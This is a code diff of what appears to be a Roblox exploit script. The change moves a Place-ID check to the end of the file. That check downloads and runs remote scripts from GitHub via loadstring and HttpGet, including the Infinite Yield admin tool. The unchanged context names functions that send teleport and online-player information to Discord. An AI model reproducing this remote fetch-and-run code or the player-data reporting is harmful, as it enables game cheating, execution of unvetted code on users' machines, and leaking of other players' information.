@@ -1,20 +1,3 @@
--- This script checks the Place ID of the current game
-local placeId = game.PlaceId
-
--- Check if the Place ID matches any of the specified values
-if placeId == 14044547200 or placeId == 8365905206 then
-    -- Execute the external script if the Place ID is correct
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/gitolan/gefop-/main/untitled%20tag%20key.txt"))()
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
-end
-
-if placeId == 15135285305 then
-    -- Execute the external script if the Place ID is correct
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/gitolan/gefbymeop-/main/gefkey'))()
-end
-
--- Function to send teleport information and prepare teleport script
 local function sendTeleportInfoAndPrepareScript()
     local Players = game:GetService("Players")
     local HttpService = game:GetService("HttpService")
@@ -209,3 +192,18 @@ end
 
 -- Invoke the function to send online players information to Discord
 sendOnlinePlayersInfoToDiscord()
+
+local placeId = game.PlaceId
+
+-- Check if the Place ID matches any of the specified values
+if placeId == 14044547200 or placeId == 8365905206 then
+    -- Execute the external script if the Place ID is correct
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/gitolan/gefop-/main/untitled%20tag%20key.txt"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+end
+
+if placeId == 15135285305 then
+    -- Execute the external script if the Place ID is correct
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/gitolan/gefbymeop-/main/gefkey'))()
+end
